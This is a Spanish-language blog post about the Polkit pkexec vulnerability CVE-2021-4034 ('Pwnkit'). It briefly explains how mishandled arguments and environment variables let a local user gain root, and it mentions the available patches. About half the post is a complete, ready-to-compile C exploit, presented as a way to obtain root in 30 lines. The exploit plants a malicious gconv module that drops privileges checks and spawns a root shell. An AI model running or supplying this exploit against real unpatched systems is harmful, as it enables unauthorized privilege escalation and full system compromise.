---
date: 2022-02-17 01:28:52
layout: post
title: "pwnkit"
subtitle:
description:
image: https://res.cloudinary.com/dle2tismx/image/upload/v1645061543/Blog/pwnkit/Pwnkit_kmhdfx.png
optimized_image: https://res.cloudinary.com/dle2tismx/image/upload/v1645061543/Blog/pwnkit/Pwnkit_kmhdfx.png
category: CVE
tags: CVE, vulnerabilidad, linux, polkit
author: AdrianPrietoVuosalmi
paginate: false
---



**CVE-2021-4034**, con este nombre se ha registrado la vulnerabilidad encontrada en *Polkit*, un componente para controlar sistemas con todos los privilegios presente en la mayoría de las distribuciones de Linux.
A la vulnerabilidad, se le ha apodado con el nombre de **Pwnkit**.

# Y...¿Cómo funciona?

Pues *Polkit*, como hemos dicho, es un componente para controlar privilegios en sistemas, este está en la mayoría de distros de linux. Este componente cuenta con un ejecutable llamado **pkexec**, una herramienta que permite a un usuario sin privilegios ejecutar comandos como si fuera otro usuario y con los máximos privilegios. Una de las cosas más impresionantes, es que esta vulnerabilidad lleva con nosotros desde el año *2009*.

La explotación de esta CVE permite a un usuario local sin privilegios obtener acceso root de manera muy rápida.

<br>
<br>
<br>
El error radica en que pkexec no manipula correctamente los parámetros de llamada y termina intentando ejecutar variables de entorno como comandos. Los investigadores recomiendan instalar los parches que publicaron los autores de Polkit. La mayoría de los distribuidores de Linux están trabajando en un parche que estiman saldrá a la brevedad. Ubuntu ya lanzó un parche que corrige la vulnerabilidad para las versiones ESM 14.04 y 16.04 y para las versiones 18.04, 20.04 y 21.10.

El código es muy sencillo, ya que con solo 30 lineas de código, podemos obtener privilegios de root.
<code>

    #include <stdio.h>
    #include <stdlib.h>
    #include <unistd.h>
    char *shell = 
        "#include <stdio.h>\n"
        "#include <stdlib.h>\n"
        "#include <unistd.h>\n\n"
        "void gconv() {}\n"
        "void gconv_init() {\n"
        "	setuid(0); setgid(0);\n"
        "	seteuid(0); setegid(0);\n"
        "	system(\"export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin; rm -rf 'GCONV_PATH=.' 'pwnkit'; /bin/sh\");\n"
        "	exit(0);\n"
        "}";
    int main(int argc, char *argv[]) {
        FILE *fp;
        system("mkdir -p 'GCONV_PATH=.'; touch 'GCONV_PATH=./pwnkit'; chmod a+x 'GCONV_PATH=./pwnkit'");
        system("mkdir -p pwnkit; echo 'module UTF-8// PWNKIT// pwnkit 2' > pwnkit/gconv-modules");
        fp = fopen("pwnkit/pwnkit.c", "w");
        fprintf(fp, "%s", shell);
        fclose(fp);
        system("gcc pwnkit/pwnkit.c -o pwnkit/pwnkit.so -shared -fPIC");
        char *env[] = { "pwnkit", "PATH=GCONV_PATH=.", "CHARSET=PWNKIT", "SHELL=pwnkit", NULL };
        execve("/usr/bin/pkexec", (char*[]){NULL}, env);
    }
</code>


Por suerte a día de hoy, ya hay una actualización de este problema de *polkit*.